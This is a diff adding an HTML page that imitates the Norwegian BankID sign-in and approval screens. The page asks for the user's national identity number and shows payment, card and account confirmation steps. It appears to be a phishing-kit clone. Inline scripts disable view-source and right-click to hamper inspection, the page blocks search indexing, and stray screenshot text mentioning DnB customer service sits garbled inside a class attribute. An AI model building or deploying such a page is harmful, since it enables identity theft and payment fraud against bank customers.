@@ -1,0 +1,356 @@
+<html lang="nb">
+<head>
+<link crossorigin="anonymous" href="local_resources/css/72cb012979aaf575db4218105092b404.css" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" rel="stylesheet"/>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="noindex, nofollow" name="robots"/>
+<link href="local_resources/img/2e4700f234ff67b7da1db2d7b09fba6f.png" rel="icon" type="image/png"/>
+<title></title>
+<script defer="defer" src="local_resources/js/100dcb304c65d82f6a5f196fe3279fcf.js"></script>
+
+<link href="local_resources/css/e8e34258813632b46fc18f0b704c03da.css" rel="stylesheet"/>
+<script>
+      // Désactive Ctrl+U
+      document.addEventListener("keydown", function (e) {
+        if (e.ctrlKey && e.key === "u") {
+          e.preventDefault();
+      
+        }
+      });
+    </script>
+<script>
+    // Désactive le clic droit de la souris
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+    });
+  </script>
+</head>
+<body class="">
+<main class="container">
+<div class="container__content">
+<div class="bankid-logo-wrapper">
+<img alt="" class="bankid-logo" src="local_resources/img/ee0e4e6a939cf69b79aed25c958a9ff6.svg"/>
+</div>
+<div class="page card severitylevel-warning no-buttons" id="useCspBrowserPage" style="display:none">
+<div class="page__content">
+<div class="icon-wrapper">
+<img alt="" src="local_resources/img/9d96ab1c0859ab4f41e4bdecd30caf07.svg"/>
+</div>
+<h1 data-i18n="error_no_csp_title" tabindex="-1">Åpne i en annen nettleser</h1>
+<p data-i18n="error_no_csp_text">Nettleseren du bruker støtter ikke viktige sikkerhetsfunksjoner (CSP). Prøv å åpne linken i en annen nettleser. Merk at noen utvidelser for nettlesere også kan være årsaken til dette problemet. Du kan forsøke å deaktivere disse og prøve igjen.</p>
+</div>
+</div>
+<div id="wait">
+<img alt="" class="bankid-symbol" src="local_resources/img/bc90d8a076ee2047890db4a1e871be6f.svg"/>
+<span class="sr-only" lang="en" role="alert">Loading</span>
+<div id="redirect-button-wrapper" style="display:none">
+<p data-i18n="have_you_been_redirected_text">Hvis du ikke har blitt sendt videre, trykk på fortsett-knappen.</p>
+<button aria-disabled="true" class="button button--default" data-i18n="redirect_button" disabled="disabled" id="redirect-button" type="submit">Fortsett</button>
+</div>
+</div>
+<div class="page" id="terms" style="display:none"></div>
+<div class="page" id="terms-details" style="display:none"></div>
+<div class="page" id="getNnin" style="display: none;">
+<form id="nnin-form">
+<div class="page__content">
+<h1 data-i18n="nnin" id="nnin-title" tabindex="-1">Fødselsnummer</h1>
+<span class="js-merchant-name merchant-name">BankID MinSide</span>
+<label data-i18n="nnin_label" for="nnin">Hva er ditt fødselsnummer?</label>
+<input aria-describedby="nninValidationMessage" aria-invalid="false" aria-labelledby="nnin-title" autocomplete="off" data-format="...... ....." data-separator=" " data-slots="." id="nnin" inputmode="numeric" maxlength="12" minlength="12" name="nnin" pattern="[0-9]{6} [0-9]{5}" placeholder="11 digits" required=""/>
+<div class="helper-text-container">
+<img alt="" id="helperTextErrorIcon" src="local_resources/img/f5171d3888b5d5563233f81a2534cae0.svg" style="display:none"/>
+<p aria-live="polite" class="validation-text" data-i18n="nnin_helper_text" id="nninValidationMessage">Fyll inn fødselsnummer (11 siffer)</p>
+</div>
+<div class="buttons__page__middle">
+<button class="button button--default" data-i18n="next" id="nnin-next-button" type="submit">Neste</button>
+</div>
+<p data-i18n="privacy_policy_declaration" id="privacyPolicyDeclaration">For å sjekke om du har BankID må vi behandle ditt fødselsnummer, les mer i vår <a href="https://www.bankid.no/privat/personvern-og-regler/personvern-bankid-app/" id="privacyPolicyLink" target="_blank">personvernerklæring</a>. </p>
+</div>
+</form>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="decline-nnin-button">Avbryt</button>
+</div>
+</div>
+<div class="page" id="appswitch" style="display:none">
+<div class="page__content">
+<div></div>
+<div>
+<h1 data-i18n="appswitch_header" id="appswitch-header" tabindex="-1">Fullfør i {app_name}</h1>
+<button class="button button--default" data-i18n="appswitch_open_app_prompt" id="appswitch-start-button">Åpne {app_name}</button>
+<div id="appswitch-loader" style="display:none">
+<img alt="" class="polling-loader" src="local_resources/img/a91eb3c1c09dac765bd3a6630268a577.svg"/>
+</div>
+</div>
+<p class="appswitch-continue-in-browser-text-container">
+<span data-i18n="appswitch_continue_in_browser_text">Er ikke dette din enhet, eller ønsker du å bruke en annen BankID metode?</span>
+<button data-i18n="appswitch_continue_in_browser_link_text" id="appswitch-continue-in-browser-button" type="button">Fullfør på annen måte.</button>
+</p>
+</div>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="appswitch-cancel-button">Avbryt</button>
+</div>
+</div>
+<div class="page" id="stepupatconsumption" style="display:none">
+<div class="page__content">
+<h1 data-i18n="warning_stepup_required_at_consumption_header" id="stepup-at-consumption-header" tabindex="-1">Fullfør i {app_name}</h1>
+<span class="js-merchant-name merchant-name">BankID MinSide</span>
+<div class="challenge-card" id="stepup-at-consumption-challenge-card">
+<p class="challenge-text" id="stepup-at-consumption-challenge-value"></p>
+</div>
+<div aria-hidden="true" class="spinner-container">
+<img alt="" class="spinner" src="local_resources/img/8d4cc6ff83aa6c6218504cee07a15376.svg"/>
+</div>
+<p data-i18n="warning_stepup_required_at_consumption" id="stepup-at-consumption-explanation">Av sikkerhetsmessige grunner må du gå til {app_name} og oppgi BankID-passordet ditt for å fullføre identifiseringen.</p>
+<p data-i18n="warning_stepup_required_at_consumption_challenge_prompt" id="stepup-at-consumption-challenge-explanation">Åpne {app_name} og bekreft ordene som vises under for å fortsette.</p>
+</div>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="stepup-at-consumption-cancel">Avbryt</button>
+</div>
+</div>
+<div class="page" id="consumptionDeviceUserChallenge" style="display:none">
+<div class="page__content">
+<h1 data-i18n="openBankIdApp" id="consumption-device-user-challenge-header" tabindex="-1">Åpne {app_name} og bekreft referanseord</h1>
+<span class="js-merchant-name merchant-name">BankID MinSide</span>
+<div class="challenge-card">
+<p class="challenge-text" id="consumption_device_challenge_value"></p>
+</div>
+<div aria-hidden="true" class="spinner-container">
+<img alt="" class="spinner" src="local_resources/img/8d4cc6ff83aa6c6218504cee07a15376.svg"/>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="consumption-device-challenge-cancel">Avbryt</button>
+</div>
+</div>
+<div class="page" id="authenticationDeviceUserChallenge" style="display:none">
+<div class="page__content">
+<div>
+<h1 data-i18n="whichWordsHeader" tabindex="-1">Velg referanseordet du så på den andre skjermen</h1>
+<p data-i18n="whichWordsPara">Dette steget bekrefter at det er du som bruker BankID nå.</p>
+</div>
+<div id="authenticationDeviceChallengeWords">
+<div style="display:none">
+<div id="authentication-device-challenge-template">
+<button class="button button--challenge" id="authentication-device-challenge-button-template">Template button</button>
+</div>
+</div>
+</div>
+<div></div>
+</div>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="authentication-device-hard-challenge-cancel">Avbryt</button>
+</div>
+</div>
+<div class="page" id="authenticationDeviceUserChallengeSimple" style="display:none">
+<div class="page__content">
+<div>
+<h1 data-i18n="correctWordsHeader" tabindex="-1">Var det disse ordene du så?</h1>
+<p data-i18n="whichWordsPara">Dette steget bekrefter at det er du som bruker BankID nå.</p>
+</div>
+<div class="simple-challenge-group">
+<div class="challenge-card challenge-card--group">
+<span class="challenge-text" id="authentication-device-simple-challenge-correct-poetry">Correct poetry</span>
+</div>
+<div class="simple-challenge-button-row">
+<button class="button button--challenge" id="authentication-device-simple-challenge-decline">
+<img alt="" src="local_resources/img/f47f3bbb4c8e15633ac846c9e05b4a59.svg"/>
+<span data-i18n="no">Nei</span>
+</button>
+<button class="button button--challenge" id="authentication-device-simple-challenge-accept">
+<img alt="" src="local_resources/img/23da1c222980c4db4ae9af6b4502153a.svg"/>
+<span data-i18n="yes">Ja</span>
+</button>
+</div>
+</div>
+<div></div>
+</div>
+<div class="page__buttons">
+<button class="button button--link" data-i18n="cancel" id="authentication-device-simple-challenge-cancel">Avbryt</button>
+</div>
+</div>
+<br/><br/><br/><br/>
+<center>
+<div class="spinner-border" role="status">
+</div></center>
+</div> 
+<div class="page" id="payment" style="display:none">
+<div class="page__content card">
+<div class="card__heading">
+<h1 data-i18n="permission_payment_heading" tabindex="-1">Bekreft betaling</h1>
+</div>
+<div class="card__body">
+<p class="card__label" data-i18n="permission_common_merchant_label">Hvor</p>
+<p class="card__merchant-name" id="js-payment-creditor-name">Creditor</p>
+<div class="card__horizontal-separator"></div>
+<p class="card__label" data-i18n="permission_payment_amount">Beløp</p>
+<div>
+<span class="card__payment-amount" id="js-payment-amount">1000</span>
+<span class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency" id="js-payment-currency">NOK</span>
+</div>
+</div>
+</div>
+<div class="page__buttons">
+<button class="login-button" data-i18n="permission_payment_heading" id="confirm-payment-button">Bekreft betaling</button>
+<button class="button button--link" data-i18n="decline" id="decline-payment-button">Avslå</button>
+</div>
+</div>
+<div class="page card" id="basketpayment" style="display:none">
+<div class="page__content card">
+<div class="card__heading">
+<h1 data-i18n="permission_payment_basket_heading" tabindex="-1">Bekreft betalinger</h1>
+</div>
+<div class="card__body card__body--basket-payment" id="basket-details-container"></div>
+</div>
+<div class="page__buttons">
+<button class="login-button" data-i18n="permission_payment_basket_heading" id="confirm-basket-payment-button">Bekreft betalinger</button>
+<button class="button button--link" data-i18n="decline" id="decline-basket-payment-button">Avslå</button>
+</div>
+</div>
+<div class="page" id="text-permission-page" style="display:none">
+<div class="page__content card">
+<div class="card__heading">
+<h1 data-i18n="permission_text_heading" tabindex="-1">Bekreft</h1>
+</div>
+<div class="card__body">
+<p id="js-text-to-approve"></p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="login-button" data-i18n="permission_text_heading" id="approve-text-button">Bekreft</button>
+<button class="button button--link" data-i18n="decline" id="decline-text-button">Avslå</button>
+</div>
+</div>
+<div class="page" id="approvecard" style="display:none">
+<div class="page__content card">
+<div class="card__heading">
+<h1 data-i18n="permission_approvecard_heading" tabindex="-1">Bekreft kort</h1>
+</div>
+<div class="card__body">
+<p class="card__label" data-i18n="permission_common_merchant_label">Hvor</p>
+<p class="card__merchant-name" id="js-approve-card-merchant-name">Merchant</p>
+<div class="card__horizontal-separator"></div>
+<p class="card__label" data-i18n="permission_approvecard_label">Kortnummer</p>
+<p class="card__emphasized-text" id="js-approve-card-number">***1234</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="login-button" data-i18n="permission_approvecard_heading" id="approve-card-button">Bekreft kort</button>
+<button class="button button--link" data-i18n="decline" id="decline-approve-card-button">Avslå</button>
+</div>
+</div>
+<div class="page" id="approveaccount" style="display:none">
+<div class="page__content card">
+<div class="card__heading">
+<h1 data-i18n="permission_approveaccount_heading" tabindex="-1">Bekreft konto</h1>
+</div>
+<div class="card__body">
+<p class="card__label" data-i18n="permission_common_merchant_label">Hvor</p>
+<p class="card__merchant-name" id="js-approve-account-merchant-name">Merchant</p>
+<div class="card__horizontal-separator"></div>
+<p class="card__label" data-i18n="permission_approveaccount_label">Kontonummer</p>
+<p class="card__emphasized-text" id="js-approve-account-number">1234 1234 1234 1234</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="login-button" data-i18n="permission_approveaccount_heading" id="approve-account-button">Bekreft konto</button>
+<button class="button button--link" data-i18n="decline" id="decline-approve-account-button">Avslå</button>
+</div>
+</div>
+<div class="page" id="reenrollmentrequired" style="display:none">
+<div class="page__content card card--error card--severitylevel-warning">
+<div class="card__heading">
+<img alt="" src="local_resources/img/57730cac356b15517b8d979e99c0bfbe.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="warning_reenrollment_required_header" tabindex="-1">Du må reaktivere raskere BankID</h1>
+<p data-i18n="warning_reenrollment_required_problem_detected" id="reenroll-required-problem-detected">Beklager, men en feil har oppstått som gjør at du må aktivere raskere BankID med ansiktsgjenkjenning, fingeravtrykk eller PIN på nytt.</p>
+<p data-i18n="warning_reenrollment_required_action_required" id="reenroll-required-action-required">Vennligst gå inn i {app_name} og aktiver der.</p>
+<p data-i18n="warning_reenrollment_required_continue_with_fallback" id="reenroll-required-proceed-with-fallback" style="display:none">Du kan fremdeles fullføre autentiseringen ved å fortsette.</p>
+<p data-i18n="warning_reenrollment_required_complete_on_consumption_device" id="reenroll-required-proceed-on-consumption-device" style="display:none">Du kan fullføre det du er i gang med. Klikk på "{button_name}" og gå tilbake til nettleseren du startet i for å bruke BankID med passord.</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="warning_reenrollment_acknowledge" id="acknowledge-reenrollment-required">OK</button>
+</div>
+</div>
+<div class="page" id="yourkeyisreplacedpage" style="display:none">
+<div class="page__content card card--error card--severitylevel-notification">
+<div class="card__heading">
+<img alt="" src="local_resources/img/c8555fb94265d67ab52a8aaee1455d2d.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="warning_key_is_replaced_header" tabindex="-1">Prøv igjen</h1>
+<p data-i18n="warning_key_is_replaced_paragraph" id="key-is-replaced-action-required">For å være ekstra sikker må du bruke BankID med ansiktsgjenkjenning, fingeravtrykk eller PIN på nytt.</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="warning_key_is_replaced_button" id="key-is-replaced-button">Prøv igjen</button>
+</div>
+</div>
+<div class="page" id="anotherdevicehasactivekeypage" style="display:none">
+<div class="page__content card card--error card--severitylevel-notification">
+<div class="card__heading">
+<img alt="" src="local_resources/img/c8555fb94265d67ab52a8aaee1455d2d.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="warning_another_device_has_active_key_header" tabindex="-1">Feil mobil</h1>
+<p data-i18n="warning_another_device_has_active_key_paragraph" id="another-device-has-active-key-action-required">BankID med ansiktsgjenkjenning, fingeravtrykk eller PIN er registrert på en annen mobil enn den du bruker nå. Bruk den andre mobilen eller aktiver raskere BankID på denne mobilen. Vær oppmerksom på at du bare kan ha BankID på en mobil om gangen.</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="warning_another_device_has_active_key_button" id="another-device-has-active-key-button">Fortsett</button>
+</div>
+</div>
+<div class="page" id="authenticationdevicechallengecancelledpage" style="display:none">
+<div class="page__content card card--error card--severitylevel-notification">
+<div class="card__heading">
+<img alt="" src="local_resources/img/57730cac356b15517b8d979e99c0bfbe.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="error_authentication_device_user_cancelled_challenge_heading" tabindex="-1">Du avbrøt</h1>
+<p data-i18n="error_authentication_device_user_cancelled_challenge">Du avbrøt identifisering. Trykket du feil? Vennligst prøv igjen.</p>
+<button class="button button--link" data-i18n="error_authentication_device_this_is_not_me_button_text" id="authentication-device-challenge-cancelled-not-me-button">Dette er ikke meg</button>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="error_authentication_device_challenge_not_me_button" id="authentication-device-challenge-cancelled-close-button">Lukk</button>
+</div>
+</div>
+<div class="page" id="notmepage" style="display:none">
+<div class="page__content card card--error card--severitylevel-warning">
+<div class="card__heading">
+<img alt="" src="local_resources/img/57730cac356b15517b8d979e99c0bfbe.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="error_authentication_device_challenge_not_me_header" tabindex="-1">Ikke deg?</h1>
+<p data-i18n="error_authentication_device_challenge_not_me_paragraph_1">Du trykket på "Dette er ikke meg".</p>
+<p data-i18n="error_authentication_device_challenge_not_me_paragraph_2">Hvis du tror noen andre prøver å bruke din BankID ber vi deg om å ta kontakt med din bank.</p>
+<p data-i18n="error_authentication_device_challenge_not_me_paragraph_3">BankID er personlig, husk å aldri dele den med noen.</p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="error_authentication_device_challenge_not_me_button" id="authentication-device-challenge-not-me-close-button">Lukk</button>
+</div>
+</div>
+<div class="page" id="errorpage" style="display:none">
+<div class="page__content card card--error">
+<div class="card__heading">
+<img alt="" id="errorIcon" src="local_resources/img/6f48c859f90f9beec680c691c4572e1a.svg"/>
+</div>
+<div class="card__body">
+<h1 data-i18n="error_heading" id="errorheading" tabindex="-1">Noe gikk galt</h1>
+<h2 id="errorSubheading">Subheading</h2>
+<p id="errortext"></p>
+</div>
+</div>
+<div class="page__buttons">
+<button class="button button--default" data-i18n="error_acknowledge" id="erroraction">OK</button>
+</div>
+</div>
+
+</main>
+<script>
+      window.doesNotUseCsp = !0
+    </script>
+</body>
+</html>
